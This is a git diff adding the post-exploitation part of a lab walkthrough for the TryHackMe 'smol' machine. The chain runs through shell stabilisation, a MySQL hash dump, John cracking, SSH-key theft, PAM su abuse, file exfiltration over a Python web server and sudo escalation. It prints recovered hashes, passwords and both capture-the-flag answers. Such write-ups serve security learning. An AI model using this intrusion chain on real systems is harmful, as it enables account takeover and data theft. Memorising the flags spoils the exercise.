@@ -1,21 +1,5 @@
-# Writeups de TryHackMe
 
-Este repositorio contiene mis notas de aprendizaje.
-
-## Herramientas Utilizadas
-* **Escaneo:** `nmap`
-* **Explotación:** `Metasploit`
-
-### Pasos realizados
-1. Enumeración de puertos.
-2. Búsqueda de vulnerabilidades.
-<img width="962" height="245" alt="image" src="https://github.com/user-attachments/assets/41276bdd-bef6-4abf-8496-48d68b03084c" />
-
-```bash
-hola mundo
-```
-
-# Maquina smol de Tryhacke
+# Tryhacke smol machine
 We are given the target on the TryHackMe page.
 <img width="1011" height="113" alt="image" src="https://github.com/user-attachments/assets/95173a87-5ac5-4b49-b1a1-201aef014b81" />
 * ip: 10.67.130.146
@@ -144,6 +128,249 @@ Finally, we execute the following URL on the webpage to download and run the thm
 By returning to the listening terminal, we will obtain the reverser shell.
 
 <img width="842" height="309" alt="image" src="https://github.com/user-attachments/assets/b3e6ad87-0403-4ba0-a7f7-77364a1adc6a" />
+
+# Nueva ip
+In my case, I exited the machine and when turning it back on, the new target became: 10.64.180.142.
+
+The shell is very basic and unstable; it is not possible to access MySQL or it loads very slowly. Therefore, a TTY is generated to obtain a more stable and fully functional terminal:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+The environment is configured to use a modern terminal such as xterm:
+
+```bash
+export TERM=xterm
+```
+Next, a Ctrl+Z is performed, which temporarily pauses the Netcat connection.
+
+In the same terminal where Ctrl+Z was pressed, the following command is executed and the Enter key is pressed twice:
+
+```bash
+stty raw -echo; fg
+```
+<img width="881" height="326" alt="image" src="https://github.com/user-attachments/assets/e15fefe2-110c-41e0-9e0a-36b20ec540f8" />
+
+Recalling the credentials obtained previously:
+
+* **Username:** wpuser
+* **Password:** kbLSF2Vop#lw3rjDZ629*Z%G
+
+We access the database:
+
+```bash
+mysql -u wpuser -p
+```
+<img width="950" height="214" alt="image" src="https://github.com/user-attachments/assets/6e0420cb-c60b-42a0-97e4-37460114cc44" />
+
+We check which databases are available:
+
+```bash
+show databases;
+```
+<img width="347" height="298" alt="image" src="https://github.com/user-attachments/assets/f58f9143-8242-49df-bd3c-89a3eb481ba3" />
+
+We use the wordpress database and list its tables:
+
+```bash
+use wordpress;
+show tables;
+```
+<img width="400" height="425" alt="image" src="https://github.com/user-attachments/assets/03d8c142-9932-41be-b0e7-614be68ae947" />
+
+We look for the table called wp_users:
+
+```bash
+describe wp_users;
+select user_login, user_pass from wp_users;
+```
+<img width="766" height="487" alt="image" src="https://github.com/user-attachments/assets/396d3674-5854-43a7-b273-9a699e15cfe5" />
+
+We save the hashes into a file called hashes.txt and use the John the Ripper tool to crack them:
+
+admin:$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
+
+wpuser:$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. 
+
+think:$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ 
+
+gege:$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 
+
+diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 
+
+xavi:$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+```
+<img width="813" height="273" alt="image" src="https://github.com/user-attachments/assets/d6662a67-15be-4b73-8f83-33c43a5193e4" />
+
+Only Diego’s password is cracked quickly; the others take much longer.
+Analyzing Diego’s case:
+
+<img width="591" height="153" alt="image" src="https://github.com/user-attachments/assets/a85cdae0-da26-4c54-acba-21f51a483544" />
+
+<img width="417" height="114" alt="image" src="https://github.com/user-attachments/assets/315e03ee-f0ca-4c53-80fc-134c34409fe1" />
+
+The remaining ones would take too long to test one by one, so nxc will be used instead.
+
+We observe that Diego’s password is cracked easily, and we check whether this user has privileged access.
+
+<img width="833" height="105" alt="image" src="https://github.com/user-attachments/assets/a5a71d03-bc7d-49ce-be6e-59a9fc4e2bf8" />
+
+It will not work because SMB is for Windows machines, and SSH will not work either.
+
+<img width="1028" height="297" alt="image" src="https://github.com/user-attachments/assets/a755de2b-1e27-4622-b0ef-be481f6a0799" />
+
+Returning to the shell that was previously obtained, the su command is used to switch to the diego user:
+
+```bash
+su - diego
+```
+<img width="727" height="94" alt="image" src="https://github.com/user-attachments/assets/f9071c4f-c565-4fb1-bcf3-bd78344953c1" />
+
+Once inside, we search for hidden files and begin a detailed enumeration. The 2>/dev/null part acts as a filter; since we are a normal user, many permission denied errors will appear. This redirection suppresses those errors. During this process, the first flag is also found:
+
+```bash
+ls -la
+cat user.txt
+find . -ls 2>/dev/null
+```
+<img width="840" height="474" alt="image" src="https://github.com/user-attachments/assets/20c0490e-9a4d-4231-b9bc-da14910d830b" />
+
+SSH stores configuration files for remote connections.
+
+<img width="1090" height="173" alt="image" src="https://github.com/user-attachments/assets/79080506-09c9-4433-8db4-ba3527540436" />
+
+We navigate to the following directory to see what can be found:
+
+```bash
+cd /think/.ssh
+ls
+```
+<img width="642" height="136" alt="image" src="https://github.com/user-attachments/assets/7dba0a63-af9c-402e-a83d-9dc805209aea" />
+
+We read the id_rsa file using cat and observe its contents.
+
+<img width="722" height="514" alt="image" src="https://github.com/user-attachments/assets/bc5a2c62-4d2b-4a47-a949-bbb27be03ec3" />
+
+On Kali, the entire key is saved into a file:
+
+```bash
+nano think_key
+```
+<img width="895" height="270" alt="image" src="https://github.com/user-attachments/assets/8b42757c-878b-4ea1-982f-789113367d40" />
+
+Then, the appropriate permissions are set to allow SSH access:
+
+```bash
+chmod 600 think_key
+```
+We connect via SSH as the think user, using the think_key private key:
+
+```bash
+ssh -i think_key think@10.64.180.142
+```
+<img width="855" height="319" alt="image" src="https://github.com/user-attachments/assets/384b0111-57b3-485b-a078-e6fbbe235664" />
+
+We list the directories (ls -lah), but more importantly, we examine the PAM configuration file located at /etc/pam.d/su. 
+
+PAM (Pluggable Authentication Modules) is a Linux security system that defines who is allowed to do what through authentication rules. To remove noise, a grep filter is applied:
+
+```bash
+cat /etc/pam.d/su | grep -v "^#"
+```
+<img width="930" height="166" alt="image" src="https://github.com/user-attachments/assets/d219625b-9b16-4634-baf8-2ae8b62db828" />
+
+Based on the findings, we discover that we can switch to the gege user without being prompted for a password:
+
+```bash
+su - gege
+```
+<img width="913" height="319" alt="image" src="https://github.com/user-attachments/assets/e23dbc81-574d-4b79-b72e-7f5cf899560a" />
+
+A .old file is found (.bak files also indicate backups). These files usually store backups made before password changes. Since the machine has Python 3 installed, we start a web server on port 8000:
+
+```bash
+python3 -m http.server 8000
+```
+<img width="1038" height="119" alt="image" src="https://github.com/user-attachments/assets/ac20a3b2-71a5-4142-aaef-b598778d2a1e" />
+
+We then download the file to Kali:
+
+```bash
+wget http://10.64.180.142:8000/wordpress.old.zip
+```
+<img width="1019" height="272" alt="image" src="https://github.com/user-attachments/assets/cfab33d3-ecea-44f6-9678-df8f61a7ecae" />
+
+When attempting to unzip the file, a password is required, so John the Ripper is used again.
+
+<img width="753" height="167" alt="image" src="https://github.com/user-attachments/assets/c488a3c6-dc07-46ff-a225-8558038cdb42" />
+
+We will extract the password hash and save it in a file called hash.txt
+
+```bash
+zip2john wordpress.old.zip > zip_hash.txt
+```
+<img width="422" height="356" alt="image" src="https://github.com/user-attachments/assets/b0b7ee72-b576-411e-9b33-dd5702dd5ca0" />
+
+Next, the password is cracked using John:
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
+```
+<img width="852" height="281" alt="image" src="https://github.com/user-attachments/assets/7bfdb3d6-4a7c-41e6-bccc-f2e9b9180c37" />
+
+* **ZIP file password:** hero_gege@hotmail.com
+
+We unzip the file again:
+
+```bash
+unzip wordpress.old.zip
+```
+Finally, we navigate into the extracted directory and read the wp-config.php file.
+
+<img width="1090" height="249" alt="image" src="https://github.com/user-attachments/assets/ad3a1d9e-e5e7-4c3a-8213-6216cc459f7c" />
+
+<img width="833" height="378" alt="image" src="https://github.com/user-attachments/assets/4a8a3dad-31c0-4f72-aa34-f06bdf12570b" />
+
+* User: xavi
+* Password: P@ssw0rdxavi@
+
+Now, from gege’s shell, we switch to the xavi user and verify that this account has privileged permissions:
+
+```bash
+su - xavi
+sudo -l   # to check if the user has privileged access
+```
+<img width="1090" height="283" alt="image" src="https://github.com/user-attachments/assets/a775a260-b826-4f73-a6d0-cdefe3483b24" />
+
+Since the user has elevated privileges, we escalate to root:
+
+```bash
+sudo su
+```
+<img width="903" height="503" alt="image" src="https://github.com/user-attachments/assets/d1b3d89a-602f-4a6a-a519-aa470c7197e0" />
+
+We then read the root.txt file.
+
+Flags found:
+
+/home/diego/user.txt : 45edaec653ff9ee06236b7ce72b86963
+
+/root/root.txt : bf89ea3ea01992353aef1f576214d4e4
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
